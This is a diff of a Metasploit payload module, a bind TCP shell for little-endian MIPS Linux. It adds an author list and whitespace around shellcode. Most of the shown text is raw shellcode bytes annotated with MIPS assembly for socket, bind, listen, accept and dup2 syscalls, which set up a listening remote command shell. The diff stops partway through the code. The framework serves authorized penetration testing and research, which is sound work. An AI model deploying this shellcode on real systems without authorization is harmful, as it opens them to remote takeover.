@@ -18,7 +18,13 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Linux Command Shell, Bind TCP Inline',
       'Description'   => 'Listen for a connection and spawn a command shell',
-      'Author'        => 'Vlatko Kosturjak',
+      'Author'        =>
+        [
+          'scut',             # Original mips-irix-portshell shellcode
+          'vaicebine',        # Original shellcode mod
+          'Vlatko Kosturjak', # Metasploit module
+          'juan vazquez'      # Optimizations
+        ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
       'Arch'          => ARCH_MIPSLE,
@@ -50,6 +56,7 @@ module Metasploit3
     "\xff\xff\x06\x28" + #     slti    a2,zero,-1
     "\x57\x10\x02\x24" + #     li      v0,4183 ( __NR_socket )
     "\x0c\x01\x01\x01" + #     syscall
+
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\xef\xff\x0e\x24" + #     li      t6,-17
     "\x27\x70\xc0\x01" + #     nor     t6,t6,zero
@@ -68,15 +75,18 @@ module Metasploit3
     "\xe0\xff\xa5\x23" + #     addi    a1,sp,-32
     "\x49\x10\x02\x24" + #     li      v0,4169 ( __NR_bind )A
     "\x0c\x01\x01\x01" + #     syscall
+
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\x01\x01\x05\x24" + #     li      a1,257
     "\x4e\x10\x02\x24" + #     li      v0,4174 ( __NR_listen )
     "\x0c\x01\x01\x01" + #     syscall
+
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xff\xff\x05\x28" + #     slti    a1,zero,-1
     "\xff\xff\x06\x28" + #     slti    a2,zero,-1
     "\x48\x10\x02\x24" + #     li      v0,4168 ( __NR_accept )
     "\x0c\x01\x01\x01" + #     syscall
+
     "\xff\xff\x50\x30" + #     andi    s0,v0,0xffff
     "\x25\x20\x10\x02" + #     or      a0,s0,s0
     "\xfd\xff\x0f\x24" + #     li      t7,-3
@@ -87,6 +97,7 @@ module Metasploit3
     "\xff\xff\x10\x24" + #     li      s0,-1
     "\xff\xff\xef\x21" + #     addi    t7,t7,-1
     "\xfa\xff\xf0\x15" + #     bne     t7,s0,dup2_loop
+
     "\x50\x73\x06\x24" + #     li      a2,0x7350
     "\xff\xff\xd0\x04" + # LB: bltzal  a2,LB
     "\x50\x73\x0f\x24" + #     li      t7,0x7350 (nop)
